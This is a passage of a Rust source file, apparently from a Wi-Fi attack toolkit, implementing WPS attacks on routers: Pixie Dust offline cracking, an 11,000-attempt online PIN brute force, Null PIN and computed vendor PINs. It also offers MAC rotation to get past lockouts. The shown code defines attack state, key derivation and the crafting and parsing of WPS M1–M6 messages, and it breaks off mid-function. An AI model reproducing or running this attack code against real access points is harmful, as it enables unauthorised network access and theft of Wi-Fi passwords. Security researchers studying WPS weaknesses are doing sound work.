//! WPS attack engines — Pixie Dust + Brute Force + Null PIN.
//!
//! Three attack modes targeting WPS PIN authentication:
//!
//! **Pixie Dust** (offline, seconds):
//!   1. Auth + Assoc with WPS IE → EAP Identity → WSC_Start
//!   2. Send M1, receive M2 → derive keys from DH exchange
//!   3. Send M3, receive M4 → extract R-Hash1/R-Hash2 + decrypt R-S1
//!   4. Offline crack: brute force PIN halves against R-Hash using known R-S1
//!   5. If R-S1 is weak (zero, predictable), PIN found in <10 seconds
//!
//! **Brute Force** (online, 11,000 attempts max):
//!   WPS PIN validation design flaw: first 4 digits (10K) validated separately
//!   from last 3+checksum (1K). Total: 11,000 instead of 100,000,000.
//!   Phase 1: iterate half1 (0000-9999) — M1→M2→M3→M4→M5, NACK = wrong
//!   Phase 2: iterate half2 (000-999+chk) — full M1→M8, extract PSK
//!   Features: lockout detection, MAC rotation, resume from PIN
//!
//! **Null PIN** (online, single attempt):
//!   Try PIN "00000000" — some misconfigured routers accept it.
//!
//! Architecture (SharedAdapter):
//!   The attack locks the channel to the target AP's channel. Uses the same
//!   auth/assoc/EAP exchange pattern as the C implementation. Each PIN attempt
//!   requires a full auth→assoc→EAP cycle with the AP.
//!
//! Ported from `wifi-map/libwifikit/attacks/attack_wps.c` (2,415 lines).

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crate::adapter::SharedAdapter;
use crate::attacks::next_attack_id;
use crate::core::{EventRing, MacAddress, TxOptions};
use crate::core::chip::ChipCaps;
use crate::store::Ap;
use crate::store::update::{
    AttackId, AttackType, AttackPhase, AttackEventKind, AttackResult, StoreUpdate,
};
use crate::protocol::frames;
use crate::protocol::ieee80211::{self, fc, fc_flags, ReasonCode, StatusCode};
use crate::protocol::wps::*;

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Attack Type
// ═══════════════════════════════════════════════════════════════════════════════

/// The 3 WPS attack modes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WpsAttackType {
    /// Pixie Dust — single exchange, offline crack. Fastest when vulnerable.
    PixieDust,
    /// Brute Force — iterate PIN halves online. 11,000 attempts max.
    BruteForce,
    /// Null PIN — try "00000000". Single attempt.
    NullPin,
    /// Computed PIN — try vendor-specific PIN generation algorithms.
    ComputedPin,
    /// Auto — smart chain: ComputedPin → PixieDust → NullPin.
    Auto,
}

impl WpsAttackType {
    pub fn name(&self) -> &'static str {
        match self {
            Self::PixieDust => "Pixie Dust",
            Self::BruteForce => "Brute Force",
            Self::NullPin => "Null PIN",
            Self::ComputedPin => "Computed PIN",
            Self::Auto => "Auto",
        }
    }

    pub fn short_name(&self) -> &'static str {
        match self {
            Self::PixieDust => "pixie",
            Self::BruteForce => "brute",
            Self::NullPin => "null-pin",
            Self::ComputedPin => "pins",
            Self::Auto => "auto",
        }
    }
}

impl std::fmt::Display for WpsAttackType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.name())
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Parameters
// ═══════════════════════════════════════════════════════════════════════════════

/// Configuration for the WPS attack.
///
/// Targets come from the scanner's Ap struct passed to start(), NOT from here.
/// This struct holds only behavior configuration: attack type, timing, limits.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct WpsParams {
    // === Attack type ===
    /// Which WPS attack to run.
    pub attack_type: WpsAttackType,

    // === Timing ===
    /// Timeout waiting for each EAP message from AP. Default: 5000ms.
    pub eap_timeout: Duration,
    /// Delay between PIN attempts (brute force). Default: 1500ms.
    pub delay_between_attempts: Duration,
    /// Delay after lockout detection. Default: 60s.
    pub lockout_delay: Duration,
    /// Wait after channel lock for PLL/AGC stabilization. Default: 50ms.
    pub channel_settle: Duration,
    /// Auth retry delay. Default: 100ms.
    pub auth_retry_delay: Duration,

    // === Limits ===
    /// Max auth retries per exchange. Default: 3.
    pub auth_retries: u32,
    /// Max assoc retries per exchange. Default: 3.
    pub assoc_retries: u32,
    /// Max PIN attempts for brute force (0 = 11,000). Default: 0.
    pub max_attempts: u32,

    // === Behavior ===
    /// Send disassociation after each exchange. Default: true.
    pub disassoc_after: bool,
    /// Rotate MAC between attempts to evade lockout. Default: false.
    pub rotate_mac: bool,
    /// Starting PIN for brute force resume. Default: None (start from 0).
    pub start_pin: Option<String>,

    // === Device identity (for M1 stealth — mimic real WPS client) ===
    /// Device name sent in M1. Default: "WPS Client".
    pub device_name: String,
    /// Manufacturer sent in M1. Default: "Broadcom".
    pub manufacturer: String,
    /// Model name sent in M1. Default: "BCM4352".
    pub model_name: String,

    // === RX ===
    /// RX poll timeout for frame reception. Default: 200ms.
    pub rx_poll_timeout: Duration,

    // === Multi-target ===
    /// Delay between consecutive targets in multi-target mode.
    /// Gives the USB adapter breathing room. Default: 500ms.
    pub inter_target_delay: Duration,
}

impl Default for WpsParams {
    fn default() -> Self {
        Self {
            attack_type: WpsAttackType::PixieDust,
            eap_timeout: Duration::from_millis(5000),
            delay_between_attempts: Duration::from_millis(1500),
            lockout_delay: Duration::from_secs(60),
            channel_settle: Duration::from_millis(50),
            auth_retry_delay: Duration::from_millis(100),
            auth_retries: 3,
            assoc_retries: 3,
            max_attempts: 0,
            disassoc_after: true,
            rotate_mac: false,
            start_pin: None,
            device_name: "WPS Client".to_string(),
            manufacturer: "Broadcom".to_string(),
            model_name: "BCM4352".to_string(),
            rx_poll_timeout: Duration::from_millis(200),
            inter_target_delay: Duration::from_millis(500),
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Attack Phase
// ═══════════════════════════════════════════════════════════════════════════════

/// Current phase of the WPS attack.
///
/// As REGISTRAR: we receive M1/M3/M5/M7, send M2/M4/M6, then NACK.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WpsPhase {
    /// Not started.
    Idle,
    /// Generating DH keypair (expensive 1536-bit modexp).
    KeyGeneration,
    /// Authenticating with AP (Open System).
    Authenticating,
    /// Associating with WPS IE.
    Associating,
    /// EAP Identity exchange.
    EapIdentity,
    /// Waiting for WSC_Start from AP.
    WscStart,
    /// Received M1 from AP (enrollee nonce + PKe + device info).
    M1Received,
    /// Sent our M2 (registrar nonce + PKr), deriving keys.
    M2Sent,
    /// Received M3 from AP (E-Hash1, E-Hash2).
    M3Received,
    /// Sent our M4 (R-Hash1, R-Hash2, encrypted R-S1).
    M4Sent,
    /// Running Pixie Dust offline crack.
    PixieCracking,
    /// Received M5 from AP (encrypted E-S1 — first half correct!).
    M5Received,
    /// Sent our M6 (encrypted R-S2).
    M6Sent,
    /// Received M7 from AP (encrypted E-S2 + credentials!).
    M7Received,
    /// Brute force Phase 1: iterating first 4 digits.
    BruteForcePhase1,
    /// Brute force Phase 2: iterating last 3+checksum digits.
    BruteForcePhase2,
    /// Waiting during lockout delay.
    LockoutWait,
    /// Trying Null PIN (00000000).
    NullPin,
    /// Attack completed.
    Done,
}

impl WpsPhase {
    /// Short label for results table display (e.g. "M3", "AUTH", "EAP").
    pub fn short_label(&self) -> &'static str {
        match self {
            Self::Idle => "-",
            Self::KeyGeneration => "DH",
            Self::Authenticating => "AUTH",
            Self::Associating => "ASSOC",
            Self::EapIdentity | Self::WscStart => "EAP",
            Self::M1Received => "M1",
            Self::M2Sent => "M2",
            Self::M3Received => "M3",
            Self::M4Sent => "M4",
            Self::M5Received => "M5",
            Self::M6Sent => "M6",
            Self::M7Received => "M7",
            Self::PixieCracking => "PIXIE",
            Self::BruteForcePhase1 => "BF/1",
            Self::BruteForcePhase2 => "BF/2",
            Self::LockoutWait => "LOCK",
            Self::NullPin => "NULL",
            Self::Done => "DONE",
        }
    }
}

impl WpsPhase {
    /// Convert to the normalized AttackPhase for delta emission.
    fn to_attack_phase(&self) -> AttackPhase {
        match self {
            Self::Idle => AttackPhase { label: "Idle", is_active: false, is_terminal: false },
            Self::KeyGeneration => AttackPhase { label: "KeyGeneration", is_active: true, is_terminal: false },
            Self::Authenticating => AttackPhase { label: "Authenticating", is_active: true, is_terminal: false },
            Self::Associating => AttackPhase { label: "Associating", is_active: true, is_terminal: false },
            Self::EapIdentity => AttackPhase { label: "EapIdentity", is_active: true, is_terminal: false },
            Self::WscStart => AttackPhase { label: "WscStart", is_active: true, is_terminal: false },
            Self::M1Received => AttackPhase { label: "M1Received", is_active: true, is_terminal: false },
            Self::M2Sent => AttackPhase { label: "M2Sent", is_active: true, is_terminal: false },
            Self::M3Received => AttackPhase { label: "M3Received", is_active: true, is_terminal: false },
            Self::M4Sent => AttackPhase { label: "M4Sent", is_active: true, is_terminal: false },
            Self::PixieCracking => AttackPhase { label: "PixieCracking", is_active: true, is_terminal: false },
            Self::M5Received => AttackPhase { label: "M5Received", is_active: true, is_terminal: false },
            Self::M6Sent => AttackPhase { label: "M6Sent", is_active: true, is_terminal: false },
            Self::M7Received => AttackPhase { label: "M7Received", is_active: true, is_terminal: false },
            Self::BruteForcePhase1 => AttackPhase { label: "BruteForcePhase1", is_active: true, is_terminal: false },
            Self::BruteForcePhase2 => AttackPhase { label: "BruteForcePhase2", is_active: true, is_terminal: false },
            Self::LockoutWait => AttackPhase { label: "LockoutWait", is_active: true, is_terminal: false },
            Self::NullPin => AttackPhase { label: "NullPin", is_active: true, is_terminal: false },
            Self::Done => AttackPhase { label: "Done", is_active: false, is_terminal: true },
        }
    }
}

impl Default for WpsPhase {
    fn default() -> Self {
        Self::Idle
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Attack Status
// ═══════════════════════════════════════════════════════════════════════════════

/// Outcome of the WPS attack.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WpsStatus {
    /// Attack still in progress.
    InProgress,
    /// PIN found + credentials extracted.
    Success,
    /// Pixie Dust data collected but couldn't crack offline.
    /// Data can be exported for external pixiewps tool.
    PixieDataOnly,
    /// PIN wrong (brute force exhausted or single attempt failed).
    PinWrong,
    /// AP locked out (too many attempts).
    Locked,
    /// Auth failed — AP didn't respond or rejected.
    AuthFailed,
    /// Assoc failed.
    AssocFailed,
    /// EAP exchange failed (timeout, unexpected message).
    EapFailed,
    /// M1 not received from AP.
    M1Failed,
    /// M3 not received from AP (E-Hash exchange failed).
    M3Failed,
    /// Attack stopped by user.
    Stopped,
    /// Generic error.
    Error,
}

impl Default for WpsStatus {
    fn default() -> Self {
        Self::InProgress
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Attack Info — real-time state snapshot
// ═══════════════════════════════════════════════════════════════════════════════

/// Tracks a completed or in-progress sub-attack for live view rendering.
#[derive(Debug, Clone)]
pub struct SubAttackInfo {
    /// Sub-attack name: "Computed PINs", "Pixie Dust", "Null PIN", "Brute Force"
    pub name: String,
    /// Status: InProgress, Success, or a failure variant.
    pub status: WpsStatus,
    /// Short detail string: "no candidates", "timeout at M3", "rejected at M4", etc.
    pub detail: String,
    /// Duration of this sub-attack.
    pub elapsed: Duration,
    /// Whether this sub-attack is currently active (has spinner).
    pub active: bool,
}

/// Real-time info snapshot for the CLI to render.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct WpsInfo {
    // === State ===
    pub phase: WpsPhase,
    pub running: bool,
    pub attack_type: WpsAttackType,
    pub status: WpsStatus,

    // === Current Target ===
    pub bssid: MacAddress,
    pub ssid: String,
    pub channel: u8,
    pub rssi: i8,
    pub vendor: String,
    pub wifi_gen: String,
    pub wps_version: u8,
    pub wps_device_name: String,

    // === Multi-target progress ===
    pub target_index: u32,
    pub target_total: u32,

    // === Per-target progress (brute force) ===
    pub current_pin: String,
    pub attempts: u32,
    pub attempts_half1: u32,
    pub attempts_half2: u32,
    pub half1_found: bool,
    pub half1_pin: String,

    // === AP Device Info (from M2) ===
    pub ap_manufacturer: String,
    pub ap_model_name: String,
    pub ap_model_number: String,
    pub ap_serial_number: String,
    pub ap_device_name: String,

    // === Sub-attack tracking (for live active zone rendering) ===
    pub sub_attacks: Vec<SubAttackInfo>,

    // === Live activity detail (what we're doing right now) ===
    pub detail: String,
    /// When the current wait started (for timeout progress bar).
    pub wait_started: Instant,
    /// Total timeout duration for the current wait (None = no progress bar).
    pub wait_timeout: Option<Duration>,

    // === Results ===
    pub pin_found: Option<String>,
    pub psk_found: Option<String>,
    pub has_pixie_data: bool,
    pub results: Vec<WpsResult>,
    pub results_count: u32,
    pub success_count: u32,

    // === Counters ===
    pub frames_sent: u64,
    pub frames_received: u64,
    pub lockouts_detected: u32,

    // === TX Feedback ===
    pub tx_feedback: crate::core::TxFeedbackSnapshot,

    // === Timing ===
    pub start_time: Instant,
    pub elapsed: Duration,
    pub frames_per_sec: f64,

    // === Final result ===
    pub final_result: Option<WpsFinalResult>,
}

/// Per-target result for multi-target mode.
#[derive(Debug, Clone)]
pub struct WpsResult {
    /// Target BSSID — used by CLI result display
    pub bssid: MacAddress,
    pub ssid: String,
    pub channel: u8,
    pub status: WpsStatus,
    pub pin: Option<String>,
    pub psk: Option<String>,
    pub attempts: u32,
    pub elapsed: Duration,
    /// AP manufacturer from M1 device info (empty if M1 never reached).
    pub manufacturer: String,
    /// AP model name from M1 device info.
    pub model: String,
    /// AP device name from M1 device info.
    pub device_name: String,
    /// Highest WPS phase reached before completion/failure.
    pub max_phase: WpsPhase,
}

/// Aggregate result after all targets have been processed.
#[allow(dead_code)]
#[derive(Debug, Clone, Default)]
pub struct WpsFinalResult {
    pub results: Vec<WpsResult>,
    pub total_attempts: u32,
    pub pins_found: u32,
    pub elapsed: Duration,
}

impl Default for WpsInfo {
    fn default() -> Self {
        Self {
            phase: WpsPhase::Idle,
            running: false,
            attack_type: WpsAttackType::PixieDust,
            status: WpsStatus::InProgress,
            bssid: MacAddress::ZERO,
            ssid: String::new(),
            channel: 0,
            rssi: 0,
            vendor: String::new(),
            wifi_gen: String::new(),
            wps_version: 0,
            wps_device_name: String::new(),
            target_index: 0,
            target_total: 0,
            current_pin: String::new(),
            attempts: 0,
            attempts_half1: 0,
            attempts_half2: 0,
            half1_found: false,
            half1_pin: String::new(),
            ap_manufacturer: String::new(),
            ap_model_name: String::new(),
            ap_model_number: String::new(),
            ap_serial_number: String::new(),
            ap_device_name: String::new(),
            sub_attacks: Vec::new(),
            detail: String::new(),
            wait_started: Instant::now(),
            wait_timeout: None,
            pin_found: None,
            psk_found: None,
            has_pixie_data: false,
            results: Vec::new(),
            results_count: 0,
            success_count: 0,
            frames_sent: 0,
            frames_received: 0,
            lockouts_detected: 0,
            tx_feedback: Default::default(),
            start_time: Instant::now(),
            elapsed: Duration::ZERO,
            frames_per_sec: 0.0,
            final_result: None,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Attack Events — discrete things that happened
// ═══════════════════════════════════════════════════════════════════════════════

/// Discrete event fired during the WPS attack.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct WpsEvent {
    pub seq: u64,
    pub timestamp: Duration,
    pub kind: WpsEventKind,
}

#[allow(dead_code)]
#[derive(Debug, Clone)]
pub enum WpsEventKind {
    /// New target started (multi-target mode).
    TargetStarted { bssid: MacAddress, ssid: String, channel: u8, index: u32, total: u32 },
    /// Target complete (multi-target mode).
    TargetComplete { bssid: MacAddress, ssid: String, status: WpsStatus, elapsed_ms: u64 },
    /// DH keypair generated (1536-bit modexp complete).
    KeyGenerated { elapsed_ms: u64 },
    /// Channel locked.
    ChannelLocked { channel: u8 },
    /// Authentication succeeded.
    AuthSuccess { bssid: MacAddress },
    /// Authentication failed.
    AuthFailed { bssid: MacAddress, attempt: u32 },
    /// Association succeeded.
    AssocSuccess { bssid: MacAddress },
    /// Association failed.
    AssocFailed { bssid: MacAddress, attempt: u32 },
    /// EAP Identity sent.
    EapIdentitySent,
    /// WSC_Start received from AP.
    WscStartReceived,
    /// WPS message sent (M1, M3, M5, M7).
    MessageSent { msg_type: WpsMessageType },
    /// WPS message received (M2, M4, M6, M8).
    MessageReceived { msg_type: WpsMessageType },
    /// Keys derived from DH exchange.
    KeysDerived,
    /// AP device info extracted from M2.
    ApDeviceInfo {
        manufacturer: String,
        model_name: String,
        model_number: String,
        serial_number: String,
        device_name: String,
    },
    /// Pixie Dust data extracted from M4.
    PixieDataExtracted { has_r_s1: bool },
    /// Pixie Dust offline crack started.
    PixieCrackStarted,
    /// Pixie Dust PIN found!
    PixieCrackSuccess { pin: String, elapsed_ms: u64 },
    /// Pixie Dust couldn't crack (data saved for export).
    PixieCrackFailed,
    /// Null PIN attempt failed.
    NullPinFailed,
    /// Brute force Phase 1 started (first 4 digits).
    BruteForcePhase1Started { total: u32 },
    /// Brute force Phase 2 started (last 3+checksum digits).
    BruteForcePhase2Started { half1: String, total: u32 },
    /// PIN attempt (brute force).
    PinAttempt { pin: String, attempt: u32 },
    /// First half correct! Moving to Phase 2.
    Half1Found { half1: String, attempts: u32 },
    /// PIN NACK — wrong PIN half.
    PinRejected { pin: String, half: u8 },
    /// Lockout detected — AP rate-limiting.
    LockoutDetected { config_error: u16, delay: Duration },
    /// Lockout wait complete.
    LockoutWaitComplete,
    /// PIN found + credentials extracted.
    PinSuccess { pin: String, psk: String },
    /// WPS Config Error received from AP.
    ConfigError { code: u16 },
    /// EAP Failure received.
    EapFailure,
    /// WSC NACK received.
    WscNackReceived { config_error: Option<u16> },
    /// Disassociation sent (cleanup).
    DisassocSent { bssid: MacAddress },
    /// Attack complete.
    AttackComplete {
        status: WpsStatus,
        elapsed: Duration,
        attempts: u32,
    },
    /// Non-fatal error.
    Error { message: String },
    // ── PIN generation events ──
    /// Computed PIN generation started.
    PinGenStarted { candidates: usize },
    /// Trying a computed PIN candidate.
    PinGenAttempt { pin: String, algo: String, attempt: usize, total: usize },
    /// Computed PIN succeeded.
    PinGenSuccess { pin: String, algo: String, psk: String },
    /// All computed PINs failed.
    PinGenFailed,
    // ── Skip events ──
    /// Current sub-attack skipped by user.
    AttackSkipped { attack_type: String },
    /// Current target skipped by user.
    TargetSkipped { idx: usize },
    // ── Enhanced Pixie Dust PRNG events ──
    /// Trying a specific PRNG recovery mode.
    PixiePrngMode { mode: String },
    /// PRNG mode successfully recovered E-S1/E-S2.
    PixiePrngRecovered { mode: String, elapsed_ms: u64 },
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WPS Session — crypto state for one EAP exchange
// ═══════════════════════════════════════════════════════════════════════════════

/// Holds all the cryptographic state for one WPS EAP-WSC exchange.
///
/// We are the REGISTRAR. The AP is the ENROLLEE.
/// We receive M1/M3/M5/M7 (odd), send M2/M4/M6 (even).
#[derive(Clone)]
struct WpsSession {
    // === Our DH keys (Registrar, generated once, reused) ===
    pub privkey: Vec<u8>,    // 192 bytes (our private key)
    pub pubkey: Vec<u8>,     // 192 bytes (PKr — our Registrar public key)

    // === Per-exchange: AP's values (from M1) ===
    pub e_nonce: [u8; 16],   // AP's enrollee nonce (from M1)
    pub pke: Vec<u8>,        // AP's enrollee public key (from M1, 192 bytes)

    // === Per-exchange: Our values ===
    pub r_nonce: [u8; 16],   // our registrar nonce (fresh each exchange)

    // === Derived keys ===
    pub authkey: [u8; 32],   // AuthKey
    pub keywrapkey: [u8; 16], // KeyWrapKey
    pub emsk: [u8; 32],      // EMSK

    // === Our Registrar secrets (R-S1, R-S2 — WE generate these) ===
    pub r_s1: [u8; 16],      // R-S1 (our secret for first PIN half)
    pub r_s2: [u8; 16],      // R-S2 (our secret for second PIN half)
    pub r_hash1: [u8; 32],   // R-Hash1 = HMAC(AuthKey, R-S1 || PSK1 || PKe || PKr)
    pub r_hash2: [u8; 32],   // R-Hash2 = HMAC(AuthKey, R-S2 || PSK2 || PKe || PKr)

    // === From AP's M3 ===
    pub e_hash1: [u8; 32],   // E-Hash1 (from M3, for Pixie Dust)
    pub e_hash2: [u8; 32],   // E-Hash2 (from M3, for Pixie Dust)

    // === From AP's M5/M7 (decrypted) ===
    pub e_s1: [u8; 16],      // E-S1 (from M5 encrypted settings)
    pub has_e_s1: bool,
    pub e_s2: [u8; 16],      // E-S2 (from M7 encrypted settings)
    pub has_e_s2: bool,

    // === EAP state ===
    pub eap_id: u8,          // current EAP identifier
    pub our_mac: MacAddress,
    pub pin: String,         // current 8-digit PIN being tested
    pub has_keys: bool,      // keys derived

    // === Device info from AP's M1 ===
    pub ap_device_info: WpsDeviceInfo,

    // === Raw message bodies for authenticator chaining ===
    pub last_msg_body: Vec<u8>,  // previous message body for HMAC chain
}

impl WpsSession {
    fn new(our_mac: MacAddress, privkey: Vec<u8>, pubkey: Vec<u8>) -> Self {
        // Generate fresh random values for registrar nonce, R-S1, R-S2, UUID-R
        let mut r_nonce = [0u8; 16];
        let mut r_s1 = [0u8; 16];
        let mut r_s2 = [0u8; 16];
        let _ = getrandom::getrandom(&mut r_nonce);
        let _ = getrandom::getrandom(&mut r_s1);
        let _ = getrandom::getrandom(&mut r_s2);

        Self {
            privkey,
            pubkey,
            e_nonce: [0; 16],
            pke: Vec::new(),
            r_nonce,
            authkey: [0; 32],
            keywrapkey: [0; 16],
            emsk: [0; 32],
            r_s1,
            r_s2,
            r_hash1: [0; 32],
            r_hash2: [0; 32],
            e_hash1: [0; 32],
            e_hash2: [0; 32],
            e_s1: [0; 16],
            has_e_s1: false,
            e_s2: [0; 16],
            has_e_s2: false,
            eap_id: 0,
            our_mac,
            pin: "12345670".to_string(),
            has_keys: false,
            ap_device_info: WpsDeviceInfo::default(),
            last_msg_body: Vec::new(),
        }
    }

    /// Reset per-exchange state for a new PIN attempt (keep DH keys).
    fn reset_for_new_attempt(&mut self) {
        // Fresh registrar nonce and secrets using OS CSPRNG
        let _ = getrandom::getrandom(&mut self.r_nonce);
        let _ = getrandom::getrandom(&mut self.r_s1);
        let _ = getrandom::getrandom(&mut self.r_s2);

        self.e_nonce = [0; 16];
        self.pke = Vec::new();
        self.authkey = [0; 32];
        self.keywrapkey = [0; 16];
        self.emsk = [0; 32];
        self.r_hash1 = [0; 32];
        self.r_hash2 = [0; 32];
        self.e_hash1 = [0; 32];
        self.e_hash2 = [0; 32];
        self.e_s1 = [0; 16];
        self.has_e_s1 = false;
        self.e_s2 = [0; 16];
        self.has_e_s2 = false;
        self.eap_id = 0;
        self.has_keys = false;
        self.last_msg_body = Vec::new();
    }

    /// Derive keys after receiving M1 and sending M2 (DH shared secret + nonces).
    ///
    /// As Registrar: DHKey = SHA-256(PKe^privkey mod p)
    /// KDK = HMAC-SHA256(DHKey, N1 || EnrolleeMAC || N2)
    /// Note: MAC is the ENROLLEE's MAC, not ours.
    fn derive_keys(&mut self, enrollee_mac: &[u8; 6]) {
        let shared = match wps_dh_shared_secret(&self.privkey, &self.pke) {
            Some(s) => s,
            None => return,
        };
        if let Some(keys) = wps_derive_keys(
            &shared,
            &self.e_nonce,
            enrollee_mac,
            &self.r_nonce,
        ) {
            self.authkey = keys.auth_key;
            self.keywrapkey = keys.key_wrap_key;
            self.emsk = keys.emsk;
            self.has_keys = true;
        }
    }

    /// Build M2 body using our session state (Registrar → Enrollee).
    /// Requires keys to be derived first (for the Authenticator).
    fn build_m2_body(&self, params: &WpsParams) -> Option<Vec<u8>> {
        // Generate UUID-R from our MAC (like reaver does)
        let mut uuid_r = [0u8; 16];
        let mac = self.our_mac.as_bytes();
        use sha2::{Sha256, Digest};
        let hash = Sha256::digest(mac);
        uuid_r.copy_from_slice(&hash[..16]);
        uuid_r[6] = (uuid_r[6] & 0x0F) | 0x40;
        uuid_r[8] = (uuid_r[8] & 0x3F) | 0x80;

        let m2_params = WpsM2Params {
            enrollee_nonce: self.e_nonce,
            registrar_nonce: self.r_nonce,
            uuid_r,
            public_key: self.pubkey.clone(),
            manufacturer: params.manufacturer.clone(),
            model_name: params.model_name.clone(),
            model_number: "1.0".to_string(),
            serial_number: "12345".to_string(),
            device_name: params.device_name.clone(),
            ..Default::default()
        };
        let mut body = build_m2(&m2_params);

        // Compute and patch Authenticator: HMAC(AuthKey, M1_body || M2_without_auth_TLV)
        // Per WPS spec: hash over M_prev || M_curr EXCLUDING the entire Authenticator TLV
        // (both header and value). Reaver/wpa_supplicant build the message without auth,
        // compute HMAC, then append. We build with placeholder then patch, so we must
        // exclude the auth TLV header (4 bytes) from the HMAC input.
        let (auth_tlv_offset, auth_val_offset) = Self::find_auth_offsets(&body)?;
        let authenticator = compute_wps_authenticator(&self.authkey, &self.last_msg_body, &body[..auth_tlv_offset])?;
        patch_authenticator_at(&mut body, auth_val_offset, &authenticator);

        Some(body)
    }

    /// Find the offsets of the Authenticator TLV within a WPS TLV body.
    /// Returns (tlv_offset, value_offset) where:
    ///   - tlv_offset: start of the TLV (type field) — used for HMAC scope
    ///   - value_offset: start of the 8-byte value — used for patching
    fn find_auth_offsets(body: &[u8]) -> Option<(usize, usize)> {
        let mut offset = 0;
        while offset + 4 <= body.len() {
            let attr_type = u16::from_be_bytes([body[offset], body[offset + 1]]);
            let length = u16::from_be_bytes([body[offset + 2], body[offset + 3]]) as usize;
            if offset + 4 + length > body.len() { return None; }
            if attr_type == attr::AUTHENTICATOR && length == 8 {
                return Some((offset, offset + 4));
            }
            offset += 4 + length;
        }
        None
    }

    /// Build M4 body: R-Hash1/R-Hash2 computed from PIN + AuthKey, encrypted R-S1.
    fn build_m4_body(&mut self) -> Option<Vec<u8>> {
        let pin_bytes = self.pin.as_bytes();
        let half1 = &pin_bytes[..4];
        let half2 = &pin_bytes[4..8];

        let psk1 = wps_hmac_sha256(&self.authkey, half1).unwrap_or([0; 32]);
        let psk2 = wps_hmac_sha256(&self.authkey, half2).unwrap_or([0; 32]);

        // R-Hash1 = HMAC-AuthKey(R-S1 || PSK1[0:16] || PKe || PKr)
        self.r_hash1 = wps_hmac_sha256_multi(
            &self.authkey,
            &[&self.r_s1, &psk1[..16], &self.pke, &self.pubkey],
        ).unwrap_or([0; 32]);
        // R-Hash2 = HMAC-AuthKey(R-S2 || PSK2[0:16] || PKe || PKr)
        self.r_hash2 = wps_hmac_sha256_multi(
            &self.authkey,
            &[&self.r_s2, &psk2[..16], &self.pke, &self.pubkey],
        ).unwrap_or([0; 32]);

        // Build encrypted settings with R-S1
        let enc_inner = build_encrypted_settings_inner(attr::R_SNONCE1, &self.r_s1, &self.authkey)?;
        let padded = pad_to_aes_block(&enc_inner);
        let iv = Self::random_iv();
        let encrypted = wps_aes_encrypt(&self.keywrapkey, &iv, &padded)?;
        let mut enc_blob = Vec::with_capacity(16 + encrypted.len());
        enc_blob.extend_from_slice(&iv);
        enc_blob.extend_from_slice(&encrypted);

        let mut body = build_m4(&self.e_nonce, &self.r_hash1, &self.r_hash2, &enc_blob);

        // Compute authenticator: HMAC(AuthKey, prev_msg || current_msg_EXCLUDING_auth_TLV)
        // Per WPS spec: exclude the entire Authenticator TLV (header + value) from HMAC input
        let (auth_tlv_offset, auth_val_offset) = Self::find_auth_offsets(&body)?;
        let authenticator = compute_wps_authenticator(&self.authkey, &self.last_msg_body, &body[..auth_tlv_offset])?;
        patch_authenticator_at(&mut body, auth_val_offset, &authenticator);

        Some(body)
    }

    /// Build M6 body: encrypted R-S2.
    fn build_m6_body(&self) -> Option<Vec<u8>> {
        let enc_inner = build_encrypted_settings_inner(attr::R_SNONCE2, &self.r_s2, &self.authkey)?;
        let padded = pad_to_aes_block(&enc_inner);
        let iv = Self::random_iv();
        let encrypted = wps_aes_encrypt(&self.keywrapkey, &iv, &padded)?;
        let mut enc_blob = Vec::with_capacity(16 + encrypted.len());
        enc_blob.extend_from_slice(&iv);
        enc_blob.extend_from_slice(&encrypted);

        let mut body = build_m6(&self.e_nonce, &enc_blob);

        let (auth_tlv_offset, auth_val_offset) = Self::find_auth_offsets(&body)?;
        let authenticator = compute_wps_authenticator(&self.authkey, &self.last_msg_body, &body[..auth_tlv_offset])?;
        patch_authenticator_at(&mut body, auth_val_offset, &authenticator);

        Some(body)
    }

    /// Generate a random 16-byte IV.
    fn random_iv() -> [u8; 16] {
        let mut iv = [0u8; 16];
        let t = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos();
        for (i, b) in iv.iter_mut().enumerate() { *b = ((t >> (i * 3)) & 0xFF) as u8; }
        iv
    }

    /// Parse M1 from AP (Enrollee): extract enrollee nonce, PKe, device info.
    fn parse_m1(&mut self, wps_body: &[u8]) -> bool {
        let msg = match parse_wps_message(wps_body) {
            Some(m) if m.msg_type == WpsMessageType::M1 => m,
            _ => return false,
        };

        if let Some(en) = msg.enrollee_nonce {
            self.e_nonce = en;
        } else {
            return false;
        }

        if let Some(pk) = &msg.public_key {
            if pk.len() == DH_PUBLIC_KEY_LEN {
                self.pke = pk.clone();
            } else {
                return false;
            }
        } else {
            return false;
        }

        self.ap_device_info = msg.device_info;
        self.last_msg_body = wps_body.to_vec();
        true
    }

    /// Parse M3 from AP: extract E-Hash1, E-Hash2.
    fn parse_m3(&mut self, wps_body: &[u8]) -> bool {
        let msg = match parse_wps_message(wps_body) {
            Some(m) if m.msg_type == WpsMessageType::M3 => m,
            _ => return false,
        };

        if let Some(eh1) = msg.e_hash1 {
            self.e_hash1 = eh1;
        } else {
            return false;
        }
        if let Some(eh2) = msg.e_hash2 {
            self.e_hash2 = eh2;
        } else {
            return false;
        }

        self.last_msg_body = wps_body.to_vec();
        true
    }

    /// Parse M5 from AP: decrypt E-S1 from encrypted settings. First half correct!
    fn parse_m5(&mut self, wps_body: &[u8]) -> bool {
        let msg = match parse_wps_message(wps_body) {
            Some(m) if m.msg_type == WpsMessageType::M5 => m,
            _ => return false,
        };

        if let Some(enc) = &msg.encrypted_settings {
            if let Some(plaintext) = decrypt_encrypted_settings(&self.keywrapkey, &self.authkey, enc) {
                if let Some(es1_data) = tlv_find(&plaintext, attr::E_SNONCE1) {
                    if es1_data.len() == 16 {
